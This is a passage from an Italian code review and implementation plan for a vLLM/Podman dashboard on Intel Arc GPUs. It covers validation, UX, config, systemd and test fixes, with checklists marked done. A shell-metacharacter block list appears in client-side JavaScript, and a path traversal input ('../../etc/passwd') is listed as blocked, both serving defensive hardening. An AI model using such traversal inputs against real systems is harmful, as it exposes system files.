    - **extra_args**: Flag aggiuntivi vLLM (allowlist: --dtype, --gpu-memory-utilization, etc)
    
    Returns:
        - success: True se container avviato
        - message: Descrizione operazione
        - container_id: ID corto container
    """
```

---

## 🟢 PROBLEMATICHE MINORI - UI/UX

### 18. **Nessuna Validazione Input JavaScript** - 🟢 UX
**File:** `app/templates/index.html`  
**Problema:**
```html
<input type="number" id="max-model-len" value="2048" ...>
<input type="text" id="extra-flags" placeholder="es. --dtype float16" ...>
```

Nessuna validazione client-side prima di inviare.

**Soluzione:**
```javascript
function validateModelRequest() {
    const modelName = document.getElementById("model-select").value;
    const maxLen = parseInt(document.getElementById("max-model-len").value);
    const extraFlags = document.getElementById("extra-flags").value;
    
    if (!modelName) {
        alert("✗ Seleziona un modello");
        return false;
    }
    
    if (isNaN(maxLen) || maxLen < 128 || maxLen > 8192) {
        alert("✗ Max Model Length deve essere tra 128 e 8192");
        return false;
    }
    
    // Valida extra flags
    const forbiddenPatterns = [";", "|", "&", "`", "$", "(", ")", "<", ">"];
    if (forbiddenPatterns.some(p => extraFlags.includes(p))) {
        alert("✗ Extra flags contiene caratteri non permessi");
        return false;
    }
    
    return true;
}

// In startOrSwitchModel():
function startOrSwitchModel() {
    if (!validateModelRequest()) return;
    // ... continua
}
```

---

### 19. **Nessun Loading State sui Pulsanti** - 🟢 UX
**Problema:**
Quando clicchi "Avvia Modello", il pulsante non cambia stato. Sembra bloccato.

**Soluzione:**
```javascript
async function startOrSwitchModel() {
    const btn = document.getElementById("btn-start");
    const originalLabel = btn.textContent;
    
    btn.disabled = true;
    btn.textContent = "⏳ Avvio in corso...";
    
    try {
        const response = await fetch("/api/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                model_name: document.getElementById("model-select").value,
                max_model_len: parseInt(document.getElementById("max-model-len").value),
                extra_args: document.getElementById("extra-flags").value
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            btn.textContent = "✓ Modello avviato!";
            setTimeout(() => {
                btn.textContent = originalLabel;
                btn.disabled = false;
            }, 2000);
        } else {
            alert(`✗ Errore: ${data.message}`);
            btn.textContent = originalLabel;
            btn.disabled = false;
        }
    } catch (error) {
        alert(`✗ Errore rete: ${error}`);
        btn.textContent = originalLabel;
        btn.disabled = false;
    }
}
```

---

### 20. **Nessun Toast/Notification per Errori** - 🟢 UX
**Problema:**
Errori vengono solo in alert(), scompaiono subito.

**Soluzione:**
```javascript
// Aggiungi in index.html
<div id="toast-container" class="fixed top-4 right-4 space-y-2 z-50">
</div>

// In JavaScript:
function showToast(message, type = "info", duration = 3000) {
    const toastDiv = document.createElement("div");
    const bgColor = {
        error: "bg-red-600",
        success: "bg-green-600",
        info: "bg-blue-600",
        warning: "bg-yellow-600"
    }[type] || "bg-blue-600";
    
    toastDiv.className = `${bgColor} text-white px-4 py-3 rounded-lg shadow-lg animate-slide-in`;
    toastDiv.textContent = message;
    
    document.getElementById("toast-container").appendChild(toastDiv);
    
    setTimeout(() => {
        toastDiv.remove();
    }, duration);
}

// Uso:
showToast("✓ Modello avviato!", "success");
showToast("✗ Errore connessione", "error");
```

---

## 🟢 PROBLEMATICHE DI CONFIGURAZIONE

### 21. **Tutto Hardcodato - Nessun Config File** - 🟢 CONFIG
**Problema:**
Per cambiare porta, immagine, modello default, devi editare il codice.

**Soluzione:** Creare `config.yaml`:
```yaml
# config.yaml
server:
  host: 0.0.0.0
  port: 5000
  reload: false  # Production!
  log_level: INFO

podman:
  container_name: vllm-intel-arc
  image: docker.io/intel/vllm:0.17.0-xpu
  gpu_telemetry_interval: 1.0

vllm:
  host: localhost
  port: 8000
  default_max_model_len: 2048
  gpu_memory_util: 0.70
  dtype: float16

paths:
  models_dir: ~/my_models
  log_dir: ~/.vllm-dashboard/logs

security:
  allowed_origins:
    - http://localhost:5000
    - http://127.0.0.1:5000
  require_api_key: false
  # api_key: ${API_KEY}  # Da env var
```

Load in Python:
```python
import yaml
from pathlib import Path

CONFIG_FILE = Path.home() / ".vllm-dashboard" / "config.yaml"

with open(CONFIG_FILE) as f:
    config_data = yaml.safe_load(f)

# Ora accedi come:
server_port = config_data["server"]["port"]
```

---

### 22. **Nessun .env per Secrets** - 🟢 CONFIG
**Soluzione:** Creare `.env.example`:
```bash
# .env.example
API_KEY=your-secret-api-key-here
VLLM_API_KEY=optional-vllm-auth
MODELS_DIR=~/my_models
REGISTRY=docker.io
LOG_LEVEL=INFO
```

Load in app:
```python
from dotenv import load_dotenv
import os

load_dotenv()

API_KEY = os.getenv("API_KEY")
```

---

### 23. **systemd Service File Non Aggiornato** - 🟢 CONFIG
**File:** `vllm-dashboard.service`  
**Problema:**
Non specifica se usa venv, ambiente, etc.

**Soluzione:** Update completo:
```ini
[Unit]
Description=vLLM Intel Arc Dashboard Manager
Documentation=https://github.com/...
After=podman.socket

[Service]
Type=simple
User=%u
WorkingDirectory=%h/vllm-intel-arc-dashboard

# Environment
Environment="PATH=%h/vllm-intel-arc-dashboard/venv/bin"
EnvironmentFile=-%h/.vllm-dashboard/.env

# Startup
ExecStart=%h/vllm-intel-arc-dashboard/venv/bin/python -m uvicorn app.main:app \
  --host 0.0.0.0 --port 5000

# Restart policy
Restart=on-failure
RestartSec=10
StartLimitInterval=60
StartLimitBurst=3

# Resource limits
MemoryMax=2G
CPUQuota=200%

# Logging
StandardOutput=journal
StandardError=journal
SyslogIdentifier=vllm-dashboard

[Install]
WantedBy=default.target
```

---

### 24. **Nessun Test** - 🟢 TESTING
**Soluzione:** Aggiungere `tests/`:
```
tests/
├── test_podman_cli.py
├── test_gpu_mon.py
├── test_main.py
└── conftest.py
```

Esempio `tests/test_gpu_mon.py`:
```python
import pytest
from app.gpu_mon import get_intel_gpu_vram, get_system_telemetry

def test_get_intel_gpu_vram():
    """Test VRAM detection"""
    vram = get_intel_gpu_vram()
    
    assert "vram_total_mb" in vram
    assert "vram_used_mb" in vram
    assert vram["vram_total_mb"] > 0
    assert 0 <= vram["vram_percent"] <= 100

def test_get_system_telemetry():
    """Test system metrics"""
    telemetry = get_system_telemetry()
    
    assert "gpu_name" in telemetry
    assert "vram" in telemetry
    assert "system" in telemetry
    assert telemetry["system"]["cpu_percent"] >= 0
```

Run con pytest:
```bash
pytest tests/ -v --cov=app
```

---

## 📋 PIANO DI IMPLEMENTAZIONE PRIORITIZZATO

### **FASE 1 - CRITICA (Sicurezza) - Tempo: 3-4 ore**
- [x] 1️⃣ **CORS Smart Config** - Auto-detect LAN + Tailscale + API Key per operazioni sensibili ✅ IMPLEMENTATO
- [x] 2️⃣ **Input Validation** - validators.py con whitelist flag + no path traversal ✅ IMPLEMENTATO
- [x] 3️⃣ **Thread-Safe Queue** - EventBroadcaster per logs ✅ IMPLEMENTATO
- [x] 4️⃣ **Exception Logging** - Structured logging setup ✅ IMPLEMENTATO (logging_config.py)
- [x] ✅ **Network Compatibility** - Verificato: rete locale + Tailscale funzionano ✅ VERIFICATO

### **FASE 2 - ARCHITETTURA (Robustezza) - Tempo: 4-5 ore**
- [x] 6️⃣ **Config System** - config.py + config.yaml ✅ IMPLEMENTATO
- [x] 7️⃣ **GPU Auto-Detect** - Dinamico VRAM totale (detect_gpu_vram in gpu_mon.py) ✅ IMPLEMENTATO
- [x] 8️⃣ **Structured Logging** - Logging module setup (logging_config.py) ✅ IMPLEMENTATO
- [x] 9️⃣ **Process Cleanup** - Signal handlers + timeouts (IMAGE_PULL_TIMEOUT, CONTAINER_START_TIMEOUT) ✅ IMPLEMENTATO
- [x] 🔟 **Model Cache** - TTL-based cache (app/cache.py) ✅ IMPLEMENTATO

### **FASE 3 - PERFORMANCE & FEATURES - Tempo: 3-4 ore**
- [x] 1️⃣1️⃣ **Model Metadata Cache** - Cache `scan_models()` (TTL 30s) + invalidazione ✅ IMPLEMENTATO
- [x] 1️⃣2️⃣ **Container Status Cache** - Cache `get_container_status()` (TTL 5s) + invalidazione ✅ IMPLEMENTATO
- [x] 1️⃣3️⃣ **Log Streaming Efficiency** - Subscriber pattern via EventBroadcaster ✅ IMPLEMENTATO
- [x] 1️⃣4️⃣ **Operation Timeouts** - Timeout parametri pull e start ✅ IMPLEMENTATO
- [x] 1️⃣5️⃣ **Health Check Endpoint** - Endpoint Kubernetes-style `/health` ✅ IMPLEMENTATO
- [x] 1️⃣6️⃣ **Polling Optimization** - Exponential backoff per `wait_for_vllm_ready()` ✅ IMPLEMENTATO

### **FASE 4 - UX & DOCUMENTATION - Tempo: 3-4 ore**
- [x] 1️⃣7️⃣ **Backup Scripts** - backup_models.sh & restore_models.sh ✅ IMPLEMENTATO
- [x] 1️⃣8️⃣ **API Docs** - Swagger UI (/docs) & ReDoc (/redoc) + OpenAPI ✅ IMPLEMENTATO
- [x] 1️⃣9️⃣ **Input Validation JS** - Client-side checks (validateStartRequest) ✅ IMPLEMENTATO
- [x] 2️⃣0️⃣ **Loading States** - Visual button feedback during operations ✅ IMPLEMENTATO
- [x] 2️⃣1️⃣ **Toast Notifications** - Toast popups in UI (showToast) ✅ IMPLEMENTATO

### **FASE 5 - CONFIGURAZIONE & TESTING - Tempo: 2-3 ore**
- [x] 2️⃣2️⃣ **Config File** - YAML support (vllm-dashboard.yaml) ✅ IMPLEMENTATO
- [x] 2️⃣3️⃣ **.env File** - Environment variables template (.env.example) ✅ IMPLEMENTATO
- [x] 2️⃣4️⃣ **Systemd Service** - Updated unit file with PATH & venv ✅ IMPLEMENTATO
- [x] 2️⃣5️⃣ **Tests** - Suite completa pytest in tests/ (10/10 passed) ✅ IMPLEMENTATO

**Tempo Totale Stima:** 15-20 ore di sviluppo

**NOVITÀ - Nuovi File nella FASE 1:**
```
app/
├── validators.py      ← Input validation + whitelist
├── security.py        ← Security utilities + auto-detect LAN
```

---

## 📚 FILE NUOVI DA CREARE

```
app/
├── config.py          ← Configuration management
├── logging_config.py  ← Structured logging setup
├── exceptions.py      ← Custom exceptions
├── validators.py      ← Input validation
└── security.py        ← Security utilities

config/
├── config.yaml        ← Configuration file
├── .env.example       ← Environment variables template

tests/
├── __init__.py
├── conftest.py
├── test_main.py
├── test_podman_cli.py
└── test_gpu_mon.py

scripts/
├── backup_models.sh   ← Backup script
└── restore_models.sh  ← Restore script

docs/
├── API.md             ← API documentation
├── SETUP.md           ← Setup guide
└── TROUBLESHOOTING.md ← Common issues
```

---

## 🎯 RACCOMANDAZIONI FINALI

1. **Priorità ASSOLUTA:** Risolvi CORS, input validation, logging
2. **Usa Type Hints:** Everywhere - aiuta debugging e IDE
3. **Aggiungi Tests:** Almeno coverage 60% per le funzioni critiche
4. **Documentazione:** README aggiornato + docstrings
5. **Monitoring:** Esponi metriche Prometheus se vuoi scale
6. **CI/CD:** GitHub Actions per testing + linting
7. **Production Mode:** `reload=False` in systemd!

---

## 🚀 FASE 2-5 - ROADMAP FUTURO

### **FASE 2 - ARCHITETTURA (Config Management) - Tempo: 2-3 ore**
- [x] 1️⃣ **Centralized Config** - `app/config.py` per tutti i parametri (ora hardcoded) ✅ IMPLEMENTATO
- [x] 2️⃣ **YAML Config File** - Supporto file `vllm-dashboard.yaml` per settings ✅ IMPLEMENTATO
- [x] 3️⃣ **GPU Auto-Detect** - Dynamic VRAM detection (sostituisce hardcoded 16GB) ✅ IMPLEMENTATO
- [x] 4️⃣ **Process Cleanup** - Timeout su container startup + graceful shutdown ✅ IMPLEMENTATO

### **FASE 3 - PERFORMANCE (Caching & Optimization) - Tempo: 2 ore**
- [x] 1️⃣ **Model Metadata Cache** - Cache `scan_models()` risultati (refresh ogni 30s) ✅ IMPLEMENTATO
- [x] 2️⃣ **Health Check Polling** - Endpoint `/health` + cache 5s status ✅ IMPLEMENTATO
- [x] 3️⃣ **Log Streaming Optimization** - Subscriber pattern via EventBroadcaster ✅ IMPLEMENTATO

### **FASE 4 - UX (Client-Side Validation) - Tempo: 1-2 ore**
- [x] 1️⃣ **JavaScript Validation** - Validazione input nel browser (mirror server-side) ✅ IMPLEMENTATO
- [x] 2️⃣ **Toast Notifications** - Success/error messages con auto-dismiss ✅ IMPLEMENTATO
- [x] 3️⃣ **Loading States** - Visual feedback durante operazioni lunghe ✅ IMPLEMENTATO

### **FASE 5 - DEPLOYMENT (Scripts & Config) - Tempo: 1 ora**
- [x] 1️⃣ **Systemd Enhancement** - EnvironmentFile per .env config + venv PATH ✅ IMPLEMENTATO
- [x] 2️⃣ **Backup Scripts** - `backup_models.sh` + `restore_models.sh` ✅ IMPLEMENTATO
- [x] 3️⃣ **Health Monitor** - Endpoint di healthcheck per monitoring (`/health`) ✅ IMPLEMENTATO

---

## ✅ CHECKLIST DI VERIFICA - Network Compatibility

Prima di considerare una fix "completa", verifica:

### Per CORS/Sicurezza:
- [x] Dashboard web da localhost:5000 funziona ✅
- [x] Dashboard da IP LAN funziona ✅
- [x] Dashboard da Tailscale funziona ✅
- [x] Open WebUI/Continue può fare inferenza da LAN ✅
- [x] Open WebUI/Continue può fare inferenza da Tailscale ✅
- [x] API Key richiesta solo per `/api/start`, `/api/stop`, `/api/pull` ✅

### Per Input Validation:
- [x] Model validi caricano correttamente ✅
- [x] Path traversal (`../../etc/passwd`) bloccato ✅
- [x] Shell metacharacters in extra_args bloccati ✅
- [x] Flag vLLM legittimi passano ✅
- [x] Flag non-whitelisted rejettati con messaggio chiaro ✅

### Per Logger/Debugging:
- [x] Errors loggati a file (non swallowed) ✅
- [x] WebSocket errors non crash l'app ✅
- [x] Processi Podman terminati su shutdown ✅

---

## 🎯 RACCOMANDAZIONI FINALI

1. **Priorità ASSOLUTA:** Valida input + CORS smart + Logging
2. **Non Rompere:** Inferenza resta pubblica sulla LAN
3. **Proteggi Risorse:** API Key per start/stop/pull
4. **Type Hints:** Everywhere per IDE support
5. **Test Network:** Verifica con client reali (Open WebUI, Cursor, etc)
6. **Production Mode:** `reload=False` in systemd!
7. **Monitoring:** `/health` endpoint per monitoraggio remoto

---

**Fine Analisi** - Generato: 2026-08-13 - ✅ **Strategia corretta per rete locale**
